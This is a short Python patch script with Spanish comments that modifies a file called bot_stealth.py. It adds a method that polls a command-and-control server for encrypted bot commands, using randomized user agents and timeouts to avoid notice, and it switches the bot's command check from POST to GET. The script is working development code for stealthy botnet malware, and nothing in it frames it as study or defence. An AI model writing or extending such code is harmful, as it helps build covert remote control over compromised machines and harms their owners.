import re

with open('bot_stealth.py', 'r') as f:
    content = f.read()

# Añadir función _get después de _post
get_func = '''
    def _get(self, endpoint):
        try:
            r = requests.get(
                f"{self.c2_url}{endpoint}",
                timeout=random.uniform(8, 15),
                headers={
                    "User-Agent": self._random_ua(),
                    "Accept": "application/json"
                }
            )
            if r.status_code == 200:
                resp_data = r.json().get("data")
                if resp_data:
                    return _decrypt_and_decompress(resp_data)
            return None
        except Exception as e:
            return None
    
'''

# Insertar _get después de _post
content = content.replace('    def register(self):', get_func + '    def register(self):')

# Cambiar check_commands para usar _get
content = content.replace(
    'result = self._post(f"/c2/stealth/check/{self.bot_id}", self._j({}))',
    'result = self._get(f"/c2/stealth/check/{self.bot_id}")'
)

with open('bot_stealth.py', 'w') as f:
    f.write(content)

print("✅ Patch aplicado")
